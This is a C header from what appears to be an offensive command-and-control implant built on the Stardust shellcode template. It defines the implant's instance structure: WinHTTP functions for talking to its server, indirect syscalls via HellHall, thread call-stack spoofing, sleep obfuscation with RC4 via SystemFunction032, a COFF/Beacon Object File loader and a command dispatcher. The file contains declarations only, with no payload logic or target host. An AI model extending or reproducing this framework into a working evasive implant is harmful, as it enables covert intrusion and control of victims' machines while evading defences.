#ifndef STARDUST_COMMON_H
#define STARDUST_COMMON_H

//
// system headers
//
#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include <stdio.h>

//
// stardust headers
//
#include <Native.h>
#include <Macros.h>
#include <Ldr.h>
#include <Defs.h>
#include <Utils.h>
#include <Constexpr.h>
#include <MiniStd.h>
#include <Syscalls.h>
#include <SysNative.h>
#include <Spoof.h>
#include <Sleep.h>
#include <Config.h>
#include <BeaconApi.h>
#include <CoffeeLdr.h>
#include <PackageParser.h>
#include <Communication.h>
#include <CommandDispatcher.h>

//
// stardust instances
//
EXTERN_C ULONG __Instance_offset;
EXTERN_C PVOID __Instance;

typedef struct _INSTANCE
{

    // Magic that will help us to find the structure in heaps
    ULONG Magic;

    //
    // base address and size
    // of the implant
    //
    BUFFER Base;

    struct
    {

        //
        // Ntdll.dll
        //
        D_API(RtlCreateHeap)
        D_API(RtlAllocateHeap)
        D_API(RtlFreeHeap)
        D_API(RtlReAllocateHeap)
        D_API(RtlWalkHeap)
        D_API(NtProtectVirtualMemory)
        D_API(RtlCreateTimerQueue)
        D_API(RtlCreateTimer)
        D_API(RtlCaptureContext)
        D_API(RtlLookupFunctionEntry)
        D_API(RtlAddVectoredExceptionHandler)
        D_API(NtContinue)
        D_API(NtSetEvent)
        D_API(NtWaitForSingleObject)
        D_API(NtSetInformationVirtualMemory)
        D_API(LdrLoadDll)
        PVOID RtlZeroMemory;

        //
        // kernel32.dll
        //
        D_API(VirtualProtect)
        D_API(VirtualFree)
        D_API(LocalFree)
        D_API(FreeLibrary)
        D_API(AddVectoredExceptionHandler)

        D_API(WinHttpCrackUrl)
        D_API(WinHttpOpen)
        D_API(WinHttpConnect)
        D_API(WinHttpOpenRequest)
        D_API(WinHttpSendRequest)
        D_API(WinHttpReceiveResponse)
        D_API(WinHttpQueryDataAvailable)
        D_API(WinHttpReadData)
        D_API(WinHttpCloseHandle)

        D_API(vprintf)
        D_API(vsnprintf)
        D_API(sprintf)

        // Spoofing Functions
        PVOID BaseThreadInitThunk;
        PVOID RtlUserThreadStart;

        // debug only
        // #ifdef DEBUG
        D_API(printf)
        D_API(strtol)
        D_API(calloc)

        D_API(NtSetContextThread)
        D_API(NtGetContextThread)
        D_API(NtDuplicateObject)
        D_API(NtSignalAndWaitForSingleObject)
        D_API(VirtualAlloc)
        D_API(MessageBoxA)
        D_API(memmove)

        NTSTATUS(WINAPI *SystemFunction032)
        (struct ustring *data, struct ustring *key);

    } Win32;

    struct
    {
        SYS_FUNC NtClose;
        SYS_FUNC NtCreateEvent;
        SYS_FUNC NtWaitForSingleObject;
        SYS_FUNC NtAllocateVirtualMemory;
        SYS_FUNC NtProtectVirtualMemory;
        SYS_FUNC NtSignalAndWaitForSingleObject;

        // This is required by HellHall, DON'T touch it
        SYS_FUNC Global;
        SYS_CONFIG SysCfg;
    } Syscall;

    struct
    {
        PVOID Ntdll;
        PVOID Kernel32;
        PVOID Cryptsp;
        PVOID WinHTTP;
        PVOID Msvcrt;
        PVOID User32;
    } Modules;

    struct
    {
        LPSTR beacon_compatibility_output;
        INT beacon_compatibility_size;
        INT beacon_compatibility_offset;

    } BOFOutput;

    PVOID Heap;
    PPEB Peb;
    PVOID CurrentTaskID;
    PVOID CoffReturn;

} INSTANCE, *PINSTANCE;

EXTERN_C PVOID StRipStart();
EXTERN_C PVOID StRipEnd();

EXTERN_C VOID Main(
    _In_ PVOID Param);

#endif // STARDUST_COMMON_H
